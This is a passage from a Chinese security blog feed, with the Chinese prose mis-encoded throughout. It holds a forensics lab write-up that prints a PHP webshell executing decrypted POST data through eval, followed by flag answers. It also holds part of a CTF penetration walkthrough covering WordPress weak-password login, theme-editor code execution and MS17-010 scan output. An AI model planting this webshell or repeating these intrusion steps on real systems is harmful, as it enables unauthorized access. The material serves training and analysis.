class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°å¯†ç </p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;rebeyond&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢æ”»å‡»æˆåŠŸçš„-IP-ä¸ºå¤šå°‘"><a href="#é»‘å®¢æ”»å‡»æˆåŠŸçš„-IP-ä¸ºå¤šå°‘" class="headerlink" title="é»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘"></a>é»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘</h2><p>æŸ¥çœ‹ç½‘ç«™é…ç½®æ—¥å¿—ï¼ŒNginx æ²¡æœ‰æ—¥å¿—ï¼ŒæŸ¥çœ‹ Apacheï¼Œæ‰¾åˆ°ä½¿ç”¨äº† shell.php çš„ IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/1500e6b2b4f72a53.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.126.1</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢çš„éšè—è´¦æˆ·åç§°"><a href="#é»‘å®¢çš„éšè—è´¦æˆ·åç§°" class="headerlink" title="é»‘å®¢çš„éšè—è´¦æˆ·åç§°"></a>é»‘å®¢çš„éšè—è´¦æˆ·åç§°</h2><p>ç›´æ¥æŸ¥çœ‹ç”¨æˆ·æ‰¾åˆ°</p><p><img src="https://img.dkdun.cn/v1/2025/12/ffff57d2a0172622.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hacker138&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå"><a href="#é»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå" class="headerlink" title="é»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå"></a>é»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå</h2><p>å‘ç°éšè—è´¦æˆ·ä¸‹é¢æœ‰ä¸€ä¸ª Kuang ç¨‹åºï¼Œæ‹¿å‡ºæ¥ pyinstaller è§£åŒ…åå† pyc åç¼–è¯‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/5ab4c353216b1537.png"></p><p>æ‹¿åˆ°åŸŸå</p><p><img src="https://img.dkdun.cn/v1/2025/12/2a49441f8cbba6cd.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;wakuang<span class="hljs-selector-class">.zhigongshanfang</span>.<span class="hljs-attribute">top</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="evtx-æ–‡ä»¶åˆ†æ"><a href="#evtx-æ–‡ä»¶åˆ†æ" class="headerlink" title="evtx æ–‡ä»¶åˆ†æ"></a>evtx æ–‡ä»¶åˆ†æ</h1><p>æŸ¥äº‹ä»¶ IDï¼š<a href="https://www.cnblogs.com/Yang34/p/13453210.html">WINDOWSæ—¥å¿—äº‹ä»¶IDé€ŸæŸ¥è¡¨</a></p><h2 id="é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„-IP-åœ°å€"><a href="#é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„-IP-åœ°å€" class="headerlink" title="é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„ IP åœ°å€"></a>é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„ IP åœ°å€</h2><p>ID ä¸º 4624 è¡¨ç¤ºå¸æˆ·å·²æˆåŠŸç™»å½•ï¼Œç›´æ¥æœç´¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/1bbc99827d84424a.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.36.133</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢ä¿®æ”¹çš„ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·å"><a href="#é»‘å®¢ä¿®æ”¹çš„ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·å" class="headerlink" title="é»‘å®¢ä¿®æ”¹çš„ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·å"></a>é»‘å®¢ä¿®æ”¹çš„ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·å</h2><p>æœç´¢ ID ä¸º 4738 æŸ¥æ‰¾å·²æ›´æ”¹çš„è´¦æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/c65649112fc0bdd3.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Adnimistartro&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢æˆåŠŸè®¿é—®çš„ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶"><a href="#é»‘å®¢æˆåŠŸè®¿é—®çš„ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶" class="headerlink" title="é»‘å®¢æˆåŠŸè®¿é—®çš„ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶"></a>é»‘å®¢æˆåŠŸè®¿é—®çš„ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶</h2><p>ID 4663 è¡¨ç¤ºå°è¯•è®¿é—®å¯¹è±¡</p><p><img src="https://img.dkdun.cn/v1/2025/12/e0c1cd4dc07b1188.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">flag&#123;<span class="hljs-built_in">SCHEMA</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢æœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹-ID-å·"><a href="#é»‘å®¢æœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹-ID-å·" class="headerlink" title="é»‘å®¢æœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹ ID å·"></a>é»‘å®¢æœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹ ID å·</h2><p>åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå…ˆæ’åºæ‰¾åˆ° MySQL çš„äº‹ä»¶ IDï¼Œå†ç­›é€‰ ID æŸ¥çœ‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/40098146549e9132.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8820</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°"><a href="#é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°" class="headerlink" title="é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°"></a>é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°</h2><p>ç­›é€‰ç³»ç»Ÿæ—¥å¿—æ¥æºäº USER32 çš„äº‹ä»¶ï¼Œ5 æ¡é‡å¯è®°å½•ï¼Œ1 æ¡ SYSTEMï¼Œ2 æ¡ Administratorã€2 æ¡ Adnimistartro</p><p><img src="https://img.dkdun.cn/v1/2025/12/03e43707ebb2a1d5.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>ç„æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>evtx åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-2022ç½‘é¼åŠå†³èµ›å¤ç›˜</title>
    <link href="/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <url>/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>AS-REP Roastingã€WordPress RCEã€RBDCã€CVE-2022-26923</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>æ— æœ</p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>æ‰«åˆ°äº†ä¸€å †</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">01:14:02</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0B</span>  - /index.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/</span><br>[<span class="hljs-meta">01:14:04</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">19</span>KB - /license.txt<br>[<span class="hljs-meta">01:14:11</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">7</span>KB - /readme.html<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">317B</span>  - /wp-admin  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-admin/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-content/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">409</span> -    <span class="hljs-number">3</span>KB - /wp-admin/setup-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-admin/install.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-admin/  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?redirect_to=http%3A%2F%2F39.99.132.104%2Fwp-admin%2F&amp;reauth=1</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">319B</span>  - /wp-content  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-content/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">1B</span>  - /wp-admin/admin-ajax.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">69B</span>  - /wp-content/plugins/akismet/akismet.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">0B</span>  - /wp-content/plugins/hello.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-content/uploads/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">777B</span>  - /wp-content/upgrade/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-includes/rss-functions.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /wp-login.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-cron.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0B</span>  - /wp-signup.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-login.php?action=register</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">320B</span>  - /wp-includes  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-includes/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">54</span>KB - /wp-includes/<br>[<span class="hljs-meta">01:14:19</span>] <span class="hljs-number">405</span> -   <span class="hljs-number">42B</span>  - /xmlrpc.php<br></code></pre></td></tr></table></figure><h1 id="WordPress-æ’ä»¶-rce"><a href="#WordPress-æ’ä»¶-rce" class="headerlink" title="WordPress æ’ä»¶ rce"></a>WordPress æ’ä»¶ rce</h1><p>wp-admin èƒ½åŠ è½½ï¼Œä¸€ä¸ª wp ç™»å½•æ¡†</p><p><img src="https://img.dkdun.cn/v1/2025/12/b7cb68187da89cfa.png"></p><p>admin:123456 ç™»é™†è¿›å»ï¼Œæœ‰ theme file editorï¼Œç›´æ¥æ”¹ php æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/1d2dea1744011397.png"></p><p>è¿ä¸Šè·¯å¾„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">132.104</span><span class="hljs-regexp">/wp-admin/</span>theme-editor.php?file=functions.php<br></code></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•æ‹¿åˆ° flag01</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;<span class="hljs-number">9</span>a8904be-<span class="hljs-number">64</span>af-<span class="hljs-number">4</span>faa-a667-d6ef0bc0ad64&#125;<br></code></pre></td></tr></table></figure><h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><p>ä¼  fscan æ‰«ä¸»æœº</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[2025-07-19 01:36:07]</span> <span class="hljs-selector-attr">[HOST]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:alive è¯¦æƒ…:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:08]</span> <span class="hljs-selector-attr">[HOST]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:alive è¯¦æƒ…:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:alive è¯¦æƒ…:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> çŠ¶æ€:alive è¯¦æƒ…:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:10]</span> <span class="hljs-selector-attr">[HOST]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:alive è¯¦æƒ…:protocol=ICMP<br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">389</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">88</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">3306</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">22</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">80</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">139</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:13]</span> <span class="hljs-selector-attr">[PORT]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:open è¯¦æƒ…:port=<span class="hljs-number">135</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:identified è¯¦æƒ…:hostname=XR-CA, ipv4=<span class="hljs-selector-attr">[172.22.15.18]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:identified è¯¦æƒ…:port=<span class="hljs-number">139</span>, domain_name=XIAORANG, workstation_service=XR-<span class="hljs-number">0687</span>, server_service=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:identified è¯¦æƒ…:ipv4=<span class="hljs-selector-attr">[172.22.15.13]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-DC01<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[VULN]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:vulnerable è¯¦æƒ…:port=<span class="hljs-number">445</span>, vulnerability=MS17-<span class="hljs-number">010</span>, os=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.35</span> çŠ¶æ€:identified è¯¦æƒ…:ipv4=<span class="hljs-selector-attr">[172.22.15.35]</span>, ipv6=<span class="hljs-selector-attr">[]</span>, hostname=XR-<span class="hljs-number">0687</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:identified è¯¦æƒ…:service=smb, os=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">445</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> 